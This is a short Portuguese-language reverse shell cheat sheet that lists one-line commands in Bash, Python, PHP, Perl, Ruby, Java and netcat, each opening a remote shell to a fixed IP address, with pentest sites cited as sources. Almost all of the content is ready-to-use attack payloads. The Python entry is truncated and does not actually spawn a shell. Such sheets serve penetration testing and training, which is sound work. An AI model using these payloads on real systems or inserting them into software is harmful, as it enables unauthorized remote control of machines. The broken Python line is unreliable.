# Reverse Shell Cheat Sheet

Os exemplos abaixo são para sistemas Linux, mas alguns podem ser testados em sistemas Windows alterando  “/bin/sh -i” por “cmd.exe”.

## Bash

Algumas versões do bash podem executar um  reverse shell (Ex: Ubuntu 10.10):

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

## Python 2.7

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))

## PHP
Esta linha de comando utiliza “TCP connection file descriptor 3”. Caso não funcione , tente 4, 5, 6…

php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

## PERL

perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

## Ruby

ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

## Java

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

## Netcat

nc -e /bin/sh 10.0.0.1 1234

## Fonte:

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://highon.coffee/blog/reverse-shell-cheat-sheet

https://github.com/pentestmonkey/php-reverse-shell
